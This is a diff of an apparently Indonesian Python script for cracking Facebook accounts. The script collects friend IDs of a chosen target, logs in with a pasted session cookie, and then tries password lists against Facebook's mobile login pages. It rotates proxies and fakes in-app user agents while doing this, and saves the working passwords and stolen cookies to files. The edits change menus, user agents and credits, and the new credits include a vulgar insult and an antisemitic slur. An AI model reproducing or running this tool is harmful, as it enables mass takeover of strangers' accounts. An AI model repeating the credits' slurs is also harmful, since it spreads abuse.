@@ -41,7 +41,7 @@ loop, ok, cp = 0,0,0
 for xd in range(10000):
     rr = random.randint; rc = random.choice
     gt = ['N4LEFH','TQ2A','QQ1B','PQ1A','SQ3A','RD1B','LDK2WU','SD2A','AB03E','Z367Q','R8638','C886H'] 
-    strvgt = f"viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .{str(rr(1,20))}; WOW64){str(rc(gt))})Applewebkit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Safari/537.36 Vivaldi/6.0.2979.18"
+    strvgt = f"Mozilla/5.0 (Linux; Android 8.1.0; Pixel C Build/OPM8.190605.005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Safari/537.36 [FB_IAB/FB4A;FBAV/313.0.0.35.119;]"
     uateddy = random.choice([strvgt])
     ugen.append(uateddy)
 
@@ -66,7 +66,7 @@ def uaku():
 		for un in aa:
 			ua.write(un+'\n')
 		ua=open('.bbnew.txt','r').read().splitlines()
-ua = random.choice(["Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1531.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/411.0.0.13.36;]","Mozilla/5.0 (Linux; Android 8.1.0; Pixel C Build/OPM8.190605.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.67 Safari/537.36 [FB_IAB/FB4A;FBAV/224.0.0.33.114;]","Mozilla/5.0 (iPhone; CPU iPhone OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A404 [FBAN/FBIOS;FBAV/196.0.0.52.95;FBBV/129677436;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/12.0.1;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/ru_RU;FBOP/5","Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57 [FBAN/FBIOS;FBAV/210.0.0.37.117;FBBV/143754374;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/3;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/145485529]"])
+ua = random.choice(["Mozilla/5.0 (Linux; Android 8.1.0; Pixel C Build/OPM8.190605.005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Safari/537.36 [FB_IAB/FB4A;FBAV/313.0.0.35.119;]","Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1531.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/411.0.0.13.36;]","Mozilla/5.0 (Linux; Android 10; SM-A700S Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.2114.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/348.0.0.12.57;]","Mozilla/5.0 (Linux; Android 9; Oneplus A99831 Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.1518.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/343.0.0.03.54;]","Mozilla/5.0 (Linux; Android 11; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.2318.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/136.0.0.14.72;]","Mozilla/5.0 (Linux; Android 9; 22041219I Build/TP1A.904992.769; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.1431.179 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/156.0.0.23.66;]","Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.1734.2 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/321.0.0.02.33;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/SD2A.276412.601; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.1576.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/469.0.0.23.21;]","Mozilla/5.0 (Linux; Android 10; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.139.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/334.0.0.15.5;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.2051.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/486.0.0.21.67;]","Mozilla/5.0 (Linux; Android 9; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.78.94 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/218.0.0.15.17;]"])
 
 #--------[ TAHUN-AKUN ]--------#    
 def tahun(fx):
@@ -181,7 +181,7 @@ def banner():
  / ___ |/ /|  / / / / /_/ / /|  /    / / / __  / /_/ / /  / /  / /__
 /_/  |_/_/ |_/ /_/  \____/_/ |_/____/_/ /_/ /_/\____/_/  /_/  /____/
                               /_____/                               
-Versi X.5                                                                                             ''')
+Versi X.8                                                                                             ''')
 #kukis
 def login3():
 	try:
@@ -209,9 +209,9 @@ def login_lagi334():
 		
 		asu = random.choice([m,k,h,b,u])
 		os.system('clear')
-		cookie=input(f'  [{h}•{x}]LOGIN COOKIE :{asu} ')
+		cookie=input(f'  [{h}•{x}]Login Cookie :{asu} ')
 		open(".cok.txt", "w").write(cookie)
-		open(".token.txt", "w").write(cookie)
+		open(".token.txt", "w").write(token)
 		with requests.Session() as rsn:
 			try:
 				rsn.headers.update({
@@ -239,12 +239,12 @@ def login_lagi334():
 			except:
 				print('Failled Get Token')
 
-		print(f'  {x}[{h}•{x}]{h} Berhasil Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
+		print(f'  {x}[{h}•{x}]{h} Berhasil Login cookie. Run ulang Script{x} ');time.sleep(1)
 		exit()
 	except Exception as e:
-		os.system("rm -f .cok.txt")
-		os.system("rm -f .token.txt")
-		print(f'  %s[%sx%s]%s LOGIN GAGAL..%s'%(x,k,x,m,x))
+		os.system("rm -f .toke.txt")
+		os.system("rm -f .co.txt")
+		print(f'  %s[%sx%s]%s LOGIN GAGAL!!%s'%(x,k,x,m,x))
 		print(e)
 		exit()
 def bot():
@@ -276,20 +276,20 @@ def menu():
 		os.system('clear')
 		login3()
 		banner()
-	prints(panel(f"""[white][[cyan]1[white]] CRACK PUBLIK [[green]  ON[white]] \n[[cyan]2[white]] FILE CLONE [white][[green] ON [white]] \n[[cyan]3[white]] GMAIL CLONE  [[green] ON [white]]\n[[cyan]4[white]] join my group [white][[red] OFF [white]] \n[[cyan]G[white]] result [[green] ON [white]]\n[[cyan]7[white]] brutal [[red]OFF [white]]\n[[cyan]5[white]] logout [white][ [red]ngapus kokie [white]] [ [green]ON [white]] """,width=43,title=f"[[green] MENU HIDANGAN [/]]",style=f"bold white"))
+	prints(panel(f"""[white][[cyan]1[white]] prack publik [[green]  ON[white]] \n[[cyan]2[white]] file clone [white][[green] ON [white]] \n[[cyan]3[white]] email clone [[green] ON [white]]\n[[cyan]4[white]] join my group [white][[green] ON [white]] \n[[cyan]G[white]] result [[green] ON [white]]\n[[cyan]7[white]] brutal [[green] ON [white]]\n[[cyan]5[white]] logout [white][ [red]ngapus kokie [white]] [ [green]ON [white]] """,width=43,title=f"[[green] MENU HIDANGAN [/]]",style=f"bold white"))
 	print(f"{kun}╭────────────────────────────────────────────{puti}")
-	CYXIEON_GANTENG = input(f'{kun}└──[{puti} pilih menu : ')
-	if CYXIEON_GANTENG in ['01','1']:
-	        idt = input('\n>> Masukan Id Target : ')
+	ANTON_404 = input(f'{kun}└──[{puti} Input menu : ')
+	if ANTON_404 in ['01','1']:
+	        idt = input('\n>> ID Target : ')
 	        dump(idt,"",{"cookie":cok},token)
 	        atur_id()
-	if CYXIEON_GANTENG in ['02','2']:
+	if ANTON_404 in ['02','2']:
 	        dump_massal()
-	elif CYXIEON_GANTENG in ['03','3']:
+	elif ANTON_404 in ['03','3']:
 	        hasil_cp()
-	elif CYXIEON_GANTENG in ['04','4']:
+	elif ANTON_404 in ['04','4']:
 	        hasil_ok()
-	elif CYXIEON_GANTENG in ['00','0']:
+	elif ANTON_404 in ['00','0']:
             ganti_cokies()
 
 #
@@ -309,7 +309,7 @@ def dump_massal():
 	bilangan = 0
 	for KOTG49H in range(kumpulkan):
 		bilangan+=1
-		prints(panel(f'[cyan]Masukkan ID Satu Persatu! ',width=43,title=f"[[green] ANTON_404 [/]]",style=f"bold white"))
+		prints(panel(f'[cyan]  ANTON_404  Masukkan ID Satu Persatu! ',width=43,title=f"[[green] ANTON_404 [/]]",style=f"bold white"))
 		Masukan = input(f' Masukin ID Yang Ke  '+str(bilangan)+f' : ')
 		uid.append(Masukan)
 	for user in uid:
@@ -343,7 +343,7 @@ def dump_massal():
 	    except requests.exceptions.ConnectionError:
 	        exit()
 	try:
-	      prints(panel(f"ANTON_404 lagi mengumpulkan id, telah sukses mengumpulkan [green]{len(id)}[white] id....",title=f"[[green]ANTON_404[/]]",style=f"bold white"))
+	      prints(panel(f" ANTON_404 lagi mengumpulkan id, telah sukses mengumpulkan [green]{len(id)}[white] id....",title=f"[[green]ANTON_404[/]]",style=f"bold white"))
 	      atur_id()
 	except requests.exceptions.ConnectionError:
 	    exit()
@@ -379,7 +379,7 @@ def dump(idt,fields,cookie,token):
 		for i in url["friends"]["data"]:
 			#print(i["id"]+"|"+i["name"])
 			id.append(i["id"]+"|"+i["name"])
-			sys.stdout.write(f"\r>> sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
+			sys.stdout.write(f"\r>> sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
 			sys.stdout.flush()
 		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
 	except:pass
@@ -493,7 +493,7 @@ def atur_method():
 	print(f'{kun}└──[{puti} 02. m.facebook.com ')
 	print(f'{kun}└──[{puti} 03. m.alpha.facebook.com ')      
 	print(f"{kun}╭────────────────────────────────────────────{puti}") 
-	CYXIEON_METHODE = input(f'{kun}└──[{puti} Pilih Method : ')
+	CYXIEON_METHODE = input(f'{kun}└──[{puti} Input method : ')
 	if CYXIEON_METHODE in ['1','01']:
 	   method.append('validate')  
 	elif CYXIEON_METHODE in ['2','02']:
@@ -503,13 +503,13 @@ def atur_method():
 	else:
 		method.append('validate')
 	print(f"{kun}╭────────────────────────────────────────────{puti}")
-	print(f'{kun}└──[{puti} Apakah Ingin Menambahkan Pw manual?? (y/t) ')
+	print(f'{kun}└──[{puti} Tambahkan pw manual (y/t) ')
 	print(f"{kun}╭────────────────────────────────────────────{puti}") 	
-	passwtamb = input(f'{kun}└──[{puti} Pilih y jika ingin menambahkan : ')
+	passwtamb = input(f'{kun}└──[{puti} Input : ')
 	if passwtamb in ['y','Y']:
 		     sandine.append('ya')
 		     print(f"{kun}╭────────────────────────────────────────────{puti}")
-		     sandiku = input(f'{kun}└──[{puti} Masukan Pw manual : ')
+		     sandiku = input(f'{kun}└──[{puti} Input Pw : ')
 		     sandimu = sandiku.split(',')
 		     for sandixnxx in sandimu:
 		         sandina.append(sandixnxx)		 
@@ -521,7 +521,7 @@ def atur_method():
 def passwordlist():
 	global prog,des
 	print(f"{kun}╭────────────────────────────────────────────{puti}")
-	print(f'{kun}└──[{puti} Crack sedang berjalan ')
+	print(f'{kun}└──[{puti} CRACK BERJALAN ')
 	print(f"{kun}─────────────────────────────────────────────{puti}")
 	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
 	des = prog.add_task('',total=len(id2))
@@ -593,7 +593,7 @@ def crackvalidate(idf,pwx,url):
 	ses = requests.Session()
 	rr = random.randint
 	rc = random.choice
-	emot = rc(["🖕","😂","😎",])
+	emot = rc(["😲","🙂"])
 	prog.update(des,description=f"\r {emot}( ANTON_404 )(%sOK:{ok}%s)(%sCP:{cp}%s)(%s {loop}%s)"%(hijo,puti,kun,puti,hijo,puti))
 	prog.advance(des)
 	for pw in pwx:
@@ -650,7 +650,6 @@ def crackvalidate(idf,pwx,url):
 				print(f"⌲ Password: {hijo}{pw}{puti}")
 				print(f"⌲ Tahun: {hijo}{tahun(idf)}{puti}")
 				print(f"⌲ Cookie: {hijo}{kuki}{puti}")
-				print(f"⌲ author: {hijo}{ANTON_404}")
 				print(f'{hijo}{ua}')
 				open('ANTON_404-OK/'+'ANTON_404-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
 				open('ANTON_404-OK/'+'ANTON_404-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
@@ -659,7 +658,6 @@ def crackvalidate(idf,pwx,url):
 				print(f"\n⌲ User ID: {kun}{idf}{puti}")
 				print(f"⌲ Password: {kun}{pw}{puti}")
 				print(f"⌲ Tahun: {kun}{tahun(idf)}{puti}")
-				print(f"⌲ tools: {kun}{ANTON_404}")
 				print(f'{kun}{ua}')
 				open('ANTON_404-CP/'+'ANTON_404-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 				akune.append(idf+'|'+pw)
@@ -679,7 +677,7 @@ def crackreguler(idf,pwx,url):
 	ses = requests.Session()
 	rr = random.randint
 	rc = random.choice
-	emot = rc(["🤡","😔","😂"])
+	emot = rc(["😝","😜","🤖"])
 	prog.update(des,description=f"\r {emot} ( ANTON_404 ) (%s OK : {ok} %s) (%s CP : {cp} %s) (%s {loop} %s) "%(hijo,puti,kun,puti,hijo,puti))
 	prog.advance(des)
 	for pw in pwx:
@@ -689,7 +687,7 @@ def crackreguler(idf,pwx,url):
 			nip = rc(proxs)
 			proxs = {'http': 'socks5://'+nip}
 			ua = rc(ugen)
-			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"]) 		
+			ua2 = rc(["Mozilla/5.0 (Linux; Android 8.1.0; Pixel C Build/OPM8.190605.005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Safari/537.36 [FB_IAB/FB4A;FBAV/313.0.0.35.119;]"]) 		
 			ses.headers.update(
 			{
 			"Host":url,
@@ -737,17 +735,15 @@ def crackreguler(idf,pwx,url):
 				print(f"⌲ Password: {hijo}{pw}{puti}")
 				print(f"⌲ Tahun: {hijo}{tahun(idf)}{puti}")
 				print(f"⌲ Cookie: {hijo}{kuki}{puti}")
-				print(f"⌲ tools: {hijo}{ANTON_404}")
 				print(f'{hijo}{ua}')
 				open('ANTON_404-OK/'+'ANTON_404-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
 				open('ANTON_404-OK/'+'ANTON_404-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
 				break			
 			elif "checkpoint" in po.cookies.get_dict().keys():
-				print(f"\n⌲ User ID: {mer}{idf}{puti}")
-				print(f"⌲ Password: {mer}{pw}{puti}")
-				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
-				print(f"⌲ tools: {hijo}{ANTON_404}")
-				print(f'{mer}{ua}')
+				print(f"\n⌲ User ID: {kun}{idf}{puti}")
+				print(f"⌲ Password: {kun}{pw}{puti}")
+				print(f"⌲ Tahun: {kun}{tahun(idf)}{puti}")
+				print(f'{kun}{ua}')
 				open('ANTON_404-CP/'+'ANTON_404-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 				akune.append(idf+'|'+pw)
 				ceker(idf,pw)
@@ -766,7 +762,7 @@ def crackasyinc(idf,pwx):
   ses = requests.Session()
   rr = random.randint
   rc = random.choice
-  emot = rc(["🤡","😔","🤖"])
+  emot = rc(["😝","😜","🖕"])
   prog.update(des,description=f"\r {emot} ( ANTON_404 ) (%s OK : {ok} %s) (%s CP : {cp} %s) (%s {loop} %s) "%(hijo,puti,kun,puti,hijo,puti))
   prog.advance(des)
   for pw in pwx:
@@ -776,7 +772,7 @@ def crackasyinc(idf,pwx):
       nip = rc(proxs)
       proxs = {'http': 'socks4://'+nip}
       ua = rc(ugen)
-      ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
+      ua2 = rc(["Mozilla/5.0 (Linux; Android 8.1.0; Pixel C Build/OPM8.190605.005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Safari/537.36 [FB_IAB/FB4A;FBAV/313.0.0.35.119;]"])
       link = ses.get('https://mbasic.facebook.com/login/?email='+idf+'&app_id=469724967619195&api_key=469724967619195&auth_token=e30a80f9070ee8fc49a23998b8eb9b54&next=https%3A%2F%2Fmbasic.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fapp_id%3D469724967619195%26cbt%3D1697161758144%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2c5574a5c040a8%2526domain%253Dpage.palm.tech%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpage.palm.tech%25252Ff2751a06ed883e4%2526relation%253Dopener%26client_id%3D469724967619195%26display%3Dtouch%26domain%3Dpage.palm.tech%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpage.palm.tech%252Fpalm-id%252F%2523%252Flogin%253Fclient-id%253Ditel-global%2526callbackUrl%253Dhttp%25253A%25252F%25252Fclub.itel-life.com%25252F%2526language%253Den_US%2526brandId%253Ditel%26locale%3Den_US%26logger_id%3Df34548c36d16038%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df18f150b67c9dac%2526domain%253Dpage.palm.tech%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpage.palm.tech%25252Ff2751a06ed883e4%2526relation%253Dopener%2526frame%253Df18a7b805567f3c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cuser_likes%26sdk%3Djoey%26version%3Dv3.2%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&li=VKIoZfrCsErYtA-k75tkXpQ4&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df18f150b67c9dac%26domain%3Dpage.palm.tech%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpage.palm.tech%252Ff2751a06ed883e4%26relation%3Dopener%26frame%3Df18a7b805567f3c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&e=1348092&skip_api_login=1&shbl=1&locale2=id_ID&refsrc=deprecated&_rdr')
       date = {
       'jazoest': re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
@@ -923,8 +919,8 @@ if __name__=='__main__':
 	
 #>>>>> THANKS TO <<<<<#
 
-#     BASARI ID
-#     ALVINO ADIJAYA
-#     ANTON KABLA
-#     JAJA_COLMEK
+#    *--> memek emak lu
+#    *--> para goym
+#    *--> ANTON_404
+
 #>>>>> THANKS TO <<<<<#
